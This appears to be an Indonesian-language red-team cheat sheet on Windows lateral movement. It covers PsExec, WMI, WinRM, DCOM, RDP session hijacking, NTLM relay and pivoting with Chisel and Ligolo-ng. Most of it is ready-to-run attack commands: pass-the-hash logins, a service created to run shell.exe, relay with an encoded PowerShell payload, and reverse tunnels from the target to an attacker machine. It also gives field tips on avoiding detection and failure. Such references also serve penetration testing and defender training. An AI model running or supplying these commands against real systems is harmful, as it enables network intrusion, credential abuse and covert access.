# ad-misc-lateral — misc

# Reference: Windows Lateral Movement

## 1. PsExec (SMB + Service Control Manager)

**Mekanisme:** Buat service via RPC over SMB (`\pipe\svcctl`), upload binary ADMIN$ share, start service → binary exec perintah.

| Item | Detail |
|---|---|
| Port | 445/tcp (SMB), 135/tcp (RPC mapper) |
| Prasyarat | Creds admin lokal /domain (atau hash via SMB), `ADMIN$` writable, `SERVICE_CREATE` |
| Artefak disk | `PSEXESVC.exe` di `C:\Windows`, event 7045 (Service Install) di System log |

```powershell
# Sysinternals
PsExec.exe \\10.10.10.5 -u DOMAIN\svc_admin -p Passw0rd cmd.exe

# Impacket (remote, tanpa Sysinternals di target)
impacket-psexec DOMAIN/admin:'Passw0rd'@10.10.10.5
impacket-psexec -hashes :NTHASH administrator@10.10.10.5   # Pass-the-Hash

# Manual (stealthier, tanpa PSEXESVC.exe di ADMIN$):
sc \\10.10.10.5 create evilsvc binpath="C:\Windows\Temp\shell.exe" start= auto
sc \\10.10.10.5 start evilsvc
sc \\10.10.10.5 delete evilsvc
```

**Kenapa berhasil:** SCM RPC authenticated → tebenggalai ADMIN$ writable berarti sudah admin.
**Kenapa gagal / berisiko:** Event 4697/7045 super-noisy; `ADMIN$` sharing dinonaktifkan; Protected Users group (banned NTLM type login).

---

## 2. WMI (DCOM + `DCOMLaunch`)

**Mekanisme:** RPC ke `ROOT\cimv2`, eksekusi via `Win32_Process.Create` / `Win32_Service`.

| Port | 135/tcp + ephemeral 49152–65535 (DCOM) |

```powershell
# One-liner via pwsh/WMI
wmic /node:10.10.10.5 /user:DOMAIN\svc_admin /password:Passw0rd process call create "cmd /c whoami > C:\Windows\Temp\o.txt"

# PowerShell remote WMI
Invoke-CimMethod -ClassName Win32_Process -ComputerName 10.10.10.5 -Credential $cred `
  -MethodName Create -Arguments @{CommandLine="cmd /c C:\Windows\Temp\shell.exe"}

# Impacket
impacket-wmiexec DOMAIN/admin:'Passw0rd'@10.10.10.5
impacket-wmiexec -hashes :NTHASH administrator@10.10.10.5
```

**Keuntungan:** no binary drop, no service → quieter dari PsExec. Log: `4648`(logon), WMI-Activity Operational log.
**Gagal jika:** DCOM disabled (hardening), firewall blok ephemeral RPC range, workstation tanpa Remote WMI ACL.

---

## 3. WinRM (HTTP(S) SOAP, PSRemoting)

| Port | 5985/tcp (HTTP), 5986/tcp (HTTPS) |
|---|---|
| Prasyarat | `TrustedHosts`/Kerberos sesuai, user di `Remote Management Users` group, atau admin |

```powershell
# Target (jika punya RCE): aktifkan
Enable-PSRemoting -Force
winrm quickconfig

# Client
$password = ConvertTo-SecureString 'Passw0rd' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ('DOMAIN\svc_admin', $password)
Invoke-Command -ComputerName 10.10.10.5 -Credential $cred -ScriptBlock { whoami }

# Shell interaktif
Enter-PSSession -ComputerName 10.10.10.5 -Credential $cred

# Relay via SOCKS proxy (chisel)
$pow = New-PSSessionOption -ProxyAccessType IEConfig
Invoke-Command -ComputerName 10.10.10.5 -Credential $cred -SessionOption (New-PSSessionOption -ProxyAccessType None) # + proxychains
```

**Apa yang terkirim:** SOAP envelope + PS payload (EncodedCommand base64 jika perlu). Log: PowerShell 4103/4104 (ScriptBlock), Event 4624 type 3.
**Crimson / evil-winrm:**
```bash
evil-winrm -i 10.10.10.5 -u svc_admin -p 'Passw0rd'
evil-winrm -i 10.10.10.5 -u administrator -H aad3b435b51404eeaad3b435b51404ee:NTHASH
```

---

## 4. DCOM Lateral (tanpa WinRM/WMI-exe)

```powershell
# MMC20.Application (default di Windows 10/11, Server 2016/2019/2022)
$c = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.10.10.5"))
$c.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c C:\Windows\Temp\shell.exe","7")

# ShellWindows (butuh Explorer jalan, cocok untuk Windows 7: browser-core)
$shell = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","10.10.10.5"))
$shell.Item().Document.Application.ShellExecute("cmd.exe","/c calc","C:\Windows\System32","open",0)

# ExcelDDE / Visio — cek ketersediaan produk
```

**Kenapa sukses:** ProgID DCOM kompatibilitas legacy, jalan di jaringan "tanpa WinRM". Log hampir nihil (tidak ada logon type 3, hasilnya "network logon via RPCSS" — misinya am-nya akses remote activation via DCOM).
**Blokir:** DCOM hardening (KB5004441-style registry: `RestrictRemoteActivation`) di Windows Server 2016+/Windows 10+.

---

## 5. RDP Hijacking (Session Shadow / tscon)

**Konteks:** punya SYSTEM/creds target, sesi RDP user masih DISCONNECTED (bukan logged off).

```
Target 10.10.10.5, sesi admin user id=4 (cek: quser / query session)
```

```cmd
:: Sebagai SYSTEM via PsExec/sch
query session
tscon 4 /dest:console               ; hijack ke console session (phishing alert)

:: Dengan creds user lain:
tscon 4 /SERVER:10.10.10.5 /password:Passw0rd /user:DOMAIN\upduser
```

**Kenapa berhasil:** `tscon` dengan SE_TCB/SE_TakeOwnership privilege membuat token baru tanpa logon baru — Windows memperlakukan seperti reconnect normal, tidak muncul Event 4624 type 10 (muncul type 2/3 di lokal SYSTEM).
**Gagal jika:** Sesu id salah → data hilang; sesi logged-off (4445/4778 tidak muncul); RDP NLA + disconnected→killed by `TimeLimit`/`EndSession` GPO.

---

## 6. SMB Relay (ntlmrelayx)

**Mekanisme:** Intercept NTLM challenge-response (Auth → amplify credentials → SMB target) — passing challenge, bukan hash, target harus SMB signing disabled.

| Syarat SMB relay | Caranya cek |
|---|---|
| Signing disabled | `crackmapexec smb 10.10.10.0/24 --gen-relay-list` / nmap `smb-security-mode` |
| Target ≠ host asal | SMB hardening: no loopback relay |
| Creds serde-able | harus admin di target |

```bash
# Cek signing
nmap -p445 --script smb-security-mode 10.10.10.5
crackmapexec smb 10.10.10.0/24 --gen-relay-list relay.txt

# Relay ke SMB
impacket-ntlmrelayx -tf relay.txt -smb2support           # dump SAM
impacket-ntlmrelayx -tf relay.txt -smb2support -c 'powershell -enc <b64>'

# Relay ke LDAP (DC, untuk credential/ACL add)
impacket-ntlmrelayx -t ldap://10.10.10.10 --delegate-access    # RBCD on ADCS/RBCD
impacket-ntlmrelayx -t ldap://10.10.10.10 --escalate-user svc_web

# Trigger auth (harus punya input ke target):
Responder -I eth0 -v                    # LLMNR/NBT-NS poison (jangan -A kalau mau SMB relay)
# Coercion: via shell di host lain (PetitPotam ~MSRPC-MS-EFSR, DFSCoerce, PrinterBug)
```

**Kenapa berhasil:** SMB signing default "enabled but not required" pada Windows 10/11 → bisa relay; LDAP default no signing.
**Gagal jika:** SMB Signing required (Windows Server DC default required!) → harus ke port 445/636 LDAP; target punya Protected Users mitm; **SMB signing default required di Windows 11 24H2/Server 2025** — relay ke host modern akan gagal; ada Patch MS16-075-type AMP protection; `--no-mdm` di Responder (disable HTTP server agar jangan stop relay SMB).

---

## 7. Pivoting — Chisel

**Reverse TCP tunnel dengan SOCKS5.**

```bash
# Attack box (server)
chisel server -p 8000 --reverse

# Target (reverse client, unduh binary ke target)
./chisel.exe client 10.20.20.10:8000 R:socks
# atau single-port forward (mis. untuk port 3389 RDP)
./chisel.exe client 10.20.20.10:8000 R:3389:10.10.10.5:3389
```

| Metadata | Value |
|---|---|
| Kompabilitas | Windows 7+ single exe, no deps |
| Socks port default | 1080 (socks5) |
| Kabur dari proxy | `--header "Host: cdn.example"` via corporate HTTP proxy |

Setelah tunnel:
```bash
# /etc/proxychains.conf: socks5 127.0.0.1 1080
proxychains crackmapexec smb 10.10.10.0/24 -u user -p pass
proxychains impacket-wmiexec DOMAIN/admin:'Pass'@10.10.10.5
```

**Apa yang muncul:** TLS/plain TCP terlihat di egress; Jika `--reverse` dgn auth `user:pass` harus modifikasi: `chisel server -p 8000 --reverse --auth user:pass`.

---

## 8. Pivoting — Ligolo-ng

**TUN-based reverse tunnel = total arti: klien via virtual interface, bukan SOCKS (kecuali proxy mode).**

```bash
# Attack box (agent -i interface)
sudo ip tuntap add user darma mode tun ligolo
sudo ip link set ligolo up
sudo ligolo_proxy -selfcert                  # generate cert
sudo ligolo_proxy -certfile cert.pem -keyfile key.pem -listen 0.0.0.0:11601

# Target (agent)
ligolo_agent.exe -connect 10.20.20.10:11601 -ignore-cert
# Di ligolo console:
ifconfig   → pilih interface tun ligolo
ip addr add 10.10.10.5/32 dev ligolo        # routing manual per target/subnet
```

| Banding | Chisel | Ligolo-ng |
|---|---|---|
| Mode | SOCKS5 (per-tool proxychains) | TUN interface (semua tools jalan langsung) |
| Performa | OK | Lebih cepat (Go QUIC-encapsulated TCP, UDP-supported) |
| Tools yang perlu konfigurasi | Semua (nmap, cme, rdp) | Nol |

**Apa dikirim:** QUIC/TLS (UDP 11601 atau TCP) egress dari target — di egress-allowlist UDP bisa blocked.
**Kenapa gagal:** corporate proxy tanpa CONNECT/UDP; DPI terhadap QUIC; admin tidak bisa menambah TUN (butuh sudo/admin).

---

## Jebakan Operasional (Fail-Modes di Lapangan)

1. **SMB Relay habis pakai** — Windows 11 24H2 / Server 2025: SMB signing *required* default. Relay ke target modern gagal sinyal; uji dengan `cme --gen-relay-list` *sebelum* operasi, jangan asumsi.
2. **Ephemeral port firewall untuk WMI/DCOM** — 135 oke tapi 49152+ terblok. PsExec over 445 tidak kena ini — pilih teknik sesuai filtrasi bukan preferensi.
3. **`ADMIN$` share disabled** oleh hardening (uninstall admin share) → PsExec/`psexec` gagal, tapi WMI/WinRM tetap oke.
4. **Laps/Local admin jarak jauh ganda** — Windows 11 23H2+/Server 2025 built-in: gunakan credential LAPS-managed account, bukan PBKDF user lama. NTLM ke ADCS/DC dari LAPS account bukan-acl bisa masih oke tapi jangan lupa `WDigest`.
5. **Protected Users group** — NTLM tidak bisa PTH-able, hanya Kerberos; PsExec/wmiexec dengan hash gagal diam-diam.
6. **Duplicate/extend proxychains bug** — nmap di SOCKS5 dengan `-sT` saja; `proxychains nmap -sS` **tidak pernah jalan** → banyak red teamer stuck.
7. **Chisel reverse tanpa `--reverse` flag di server** → `R:socks` gagal, error "reverse not enabled".
8. **Ligolo tanpa `ip addr add`** → routing tak oke, semua tools timeout silent. Literally #1 pain.
9. **tscon mis-id sesi** → `quser` ulang dan verifikasi STATE `Disc` bukan `Down`; salah hijack sesi Aktif → kunci layar target & alarm SOC.
10. **WinRM TrustedHosts** — unik: `Invoke-Command` NTLM ke hostname bukan FQDN gagal; workgroup default hanya `TrustedHosts` setelah `winrm quickconfig`. Perbaiki: `Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force`.
11. **RDP NLA + sesi terputus di 30 menit (GPO)** → RDP hijack tembus jendela sempit; cek `quser` *sebelum* kerja.
12. **Penting — non-aktifkan Responder servers di SMB relay** (Responder default aktif SMB) — mismatch auth challenge makan relay maut. Gunakan `responder -I eth0 --disable-SMB` atau `-A` jangan.

---

## Referensi Tooling

| Tool | Versi uji |
|---|---|
| chisel | 1.9.0 |
| ligolo-ng | 0.7.x |
| impacket | 0.12.0.dev1 |
| evil-winrm | 3.0 |
| crackmapexec | netexec v1.2.0 (continuation) |
| Sysinternals PsExec | 2.2+ (v2.6 terakhir) |

Target-hypotesis default: Windows Server 2019/2022 DC, Windows 10 21H2 / Windows 11 23H2 workstation — teknik di atas berlaku; untuk 24H2 re-test signing & LAPS.

---

## [reasoning trace]


